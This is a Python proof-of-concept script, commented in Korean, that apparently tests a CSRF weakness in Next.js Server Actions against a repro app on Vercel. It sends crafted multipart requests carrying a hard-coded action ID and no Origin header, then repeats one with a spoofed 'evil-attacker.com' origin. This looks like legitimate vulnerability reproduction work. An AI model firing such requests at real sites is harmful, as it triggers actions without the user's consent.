import requests
import io
from datetime import datetime

# ========== 설정 ==========
VERCEL_URL = "https://nextjs-sa-repro.vercel.app/"
ACTION_ID = "40e2d20e19c4d164fc0b8f9bd3c6d12a3c8b95f0b7"
# ==========================

print("=" * 70)
print("🔐 Next.js Server Actions CSRF 취약점 테스트 (v3 - 최종)")
print("=" * 70)
print(f"대상 URL: {VERCEL_URL}")
print(f"Action ID: {ACTION_ID}")
print(f"테스트 시작: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("=" * 70)

def test_method_1_multipart():
    """
    방법 1: multipart/form-data (files 파라미터 사용)
    """
    print("\n[Method 1] Multipart/form-data 방식")
    print("-" * 70)
    
    files = {
        '0': (None, '["$K1"]'),
        f'1_$ACTION_ID_{ACTION_ID}': (None, ''),
        '1_testData': (None, 'CSRF_MULTIPART_TEST'),
    }
    
    headers = {
        'Accept': 'text/x-component',
        'next-action': ACTION_ID,
    }
    
    try:
        response = requests.post(VERCEL_URL, files=files, headers=headers, timeout=10)
        print(f"✓ 상태 코드: {response.status_code}")
        print(f"✓ Content-Type: {response.headers.get('Content-Type', 'N/A')}")
        print(f"✓ 응답 길이: {len(response.text)} bytes")
        print(f"✓ 응답 내용:\n{response.text}")
        
        if response.status_code == 200:
            if 'success' in response.text and 'CSRF_MULTIPART_TEST' in response.text:
                print("\n🚨 취약점 확인! 데이터가 제대로 전송되었습니다!")
                return True
            elif '"$undefined"' in response.text:
                print("\n⚠️ Server Action은 실행되었지만 undefined 반환")
                print("   → 이것도 취약점! (외부에서 액션 호출 성공)")
                return True
        
        return False
        
    except Exception as e:
        print(f"❌ 에러: {e}")
        return False

def test_method_2_raw_multipart():
    """
    방법 2: 수동으로 구성한 multipart body
    브라우저가 보내는 것과 동일한 형식
    """
    print("\n[Method 2] 수동 구성 Multipart Body")
    print("-" * 70)
    
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    
    # 브라우저가 보내는 정확한 형식으로 구성
    body_parts = []
    
    # Part 1: Action reference
    body_parts.append(f'--{boundary}')
    body_parts.append(f'Content-Disposition: form-data; name="0"')
    body_parts.append('')
    body_parts.append('["$K1"]')
    
    # Part 2: Action ID
    body_parts.append(f'--{boundary}')
    body_parts.append(f'Content-Disposition: form-data; name="1_$ACTION_ID_{ACTION_ID}"')
    body_parts.append('')
    body_parts.append('')
    
    # Part 3: Actual data
    body_parts.append(f'--{boundary}')
    body_parts.append(f'Content-Disposition: form-data; name="1_testData"')
    body_parts.append('')
    body_parts.append('MANUAL_CSRF_TEST')
    
    # End boundary
    body_parts.append(f'--{boundary}--')
    body_parts.append('')
    
    body = '\r\n'.join(body_parts)
    
    headers = {
        'Accept': 'text/x-component',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'next-action': ACTION_ID,
    }
    
    try:
        response = requests.post(
            VERCEL_URL, 
            data=body.encode('utf-8'),
            headers=headers,
            timeout=10
        )
        
        print(f"✓ 상태 코드: {response.status_code}")
        print(f"✓ 응답:\n{response.text}")
        
        if response.status_code == 200:
            if 'MANUAL_CSRF_TEST' in response.text:
                print("\n🚨 취약점 확인! (수동 구성 성공)")
                return True
            elif '"$undefined"' in response.text:
                print("\n⚠️ Server Action 실행됨 (undefined 반환)")
                return True
        
        return False
        
    except Exception as e:
        print(f"❌ 에러: {e}")
        return False

def test_method_3_check_logs():
    """
    방법 3: Vercel 로그 확인을 위한 특별한 페이로드
    """
    print("\n[Method 3] Vercel 로그 확인용 테스트")
    print("-" * 70)
    print("이 테스트는 Vercel 로그에 특별한 메시지를 남깁니다.")
    
    timestamp = datetime.now().strftime('%H:%M:%S')
    test_payload = f'CSRF_LOG_CHECK_{timestamp}'
    
    files = {
        '0': (None, '["$K1"]'),
        f'1_$ACTION_ID_{ACTION_ID}': (None, ''),
        '1_testData': (None, test_payload),
    }
    
    headers = {
        'Accept': 'text/x-component',
        'next-action': ACTION_ID,
    }
    
    try:
        response = requests.post(VERCEL_URL, files=files, headers=headers, timeout=10)
        print(f"✓ 상태 코드: {response.status_code}")
        print(f"✓ 응답:\n{response.text}")
        
        if response.status_code == 200:
            print(f"\n📋 Vercel Dashboard → Logs 에서 다음을 검색하세요:")
            print(f"   '{test_payload}'")
            print(f"   만약 로그에 이 값이 보인다면 → Server Action이 실행된 것!")
            return True
        
        return False
        
    except Exception as e:
        print(f"❌ 에러: {e}")
        return False

def analyze_response(response_text):
    """
    응답 분석
    """
    print("\n" + "=" * 70)
    print("📊 응답 분석")
    print("=" * 70)
    
    if '"$undefined"' in response_text:
        print("✓ '$undefined' 발견됨")
        print("  → Server Action은 실행되었으나 반환값이 undefined")
        print("  → 가능한 원인:")
        print("    1. actions.ts에서 return 문이 없음")
        print("    2. FormData.get()이 데이터를 못 찾음")
        print("    3. 비동기 처리 문제")
    
    if 'success' in response_text:
        print("✓ 'success' 발견됨")
        print("  → Server Action이 성공적으로 실행되고 데이터 반환함!")
    
    if '{"a":"$@1"' in response_text:
        print("✓ React Server Component 응답 형식")
        print("  → Next.js가 Server Action 응답으로 인식함")

def test_with_origin_for_comparison():
    """
    비교를 위해 Origin 헤더를 포함한 테스트
    """
    print("\n[Comparison] Origin 헤더 포함 (차단되어야 함)")
    print("-" * 70)
    
    files = {
        '0': (None, '["$K1"]'),
        f'1_$ACTION_ID_{ACTION_ID}': (None, ''),
        '1_testData': (None, 'WITH_ORIGIN'),
    }
    
    headers = {
        'Accept': 'text/x-component',
        'next-action': ACTION_ID,
        'Origin': 'https://evil-attacker.com',
    }
    
    try:
        response = requests.post(VERCEL_URL, files=files, headers=headers, timeout=10)
        print(f"✓ 상태 코드: {response.status_code}")
        
        if response.status_code == 500:
            print("✅ Origin 검증 작동: 차단됨 (예상대로)")
        else:
            print("⚠️ Origin 검증 실패: 통과됨 (더 심각한 문제!)")
        
    except Exception as e:
        print(f"에러: {e}")

if __name__ == "__main__":
    results = []
    
    # 모든 테스트 실행
    print("\n🧪 테스트 시작...\n")
    
    results.append(("Method 1", test_method_1_multipart()))
    results.append(("Method 2", test_method_2_raw_multipart()))
    results.append(("Method 3", test_method_3_check_logs()))
    
    # Origin 비교 테스트
    test_with_origin_for_comparison()
    
    # 최종 결과
    print("\n" + "=" * 70)
    print("🎯 최종 결과 요약")
    print("=" * 70)
    
    for name, success in results:
        status = "✅ 성공" if success else "❌ 실패"
        print(f"{name}: {status}")
    
    if any(success for _, success in results):
        print("\n" + "!" * 70)
        print("🚨 취약점 확인!")
        print("!" * 70)
        print("외부 도메인에서 Origin 헤더 없이 Server Action 호출 가능!")
        print("이는 CSRF 보호 메커니즘의 우회를 의미합니다.")
        print("\n다음 단계:")
        print("1. 브라우저에서 정상 제출 시 응답 확인 (비교용)")
        print("2. Vercel Logs 확인 (Server Action 실행 로그)")
        print("3. 스크린샷 촬영 및 문서화")
    else:
        print("\n⚠️ 모든 테스트 실패")
        print("추가 조사 필요:")
        print("1. 브라우저에서 Network 탭의 정확한 요청 형식 복사")
        print("2. actions.ts 코드 재확인")
        print("3. Next.js 버전 확인")
    
    print("=" * 70)
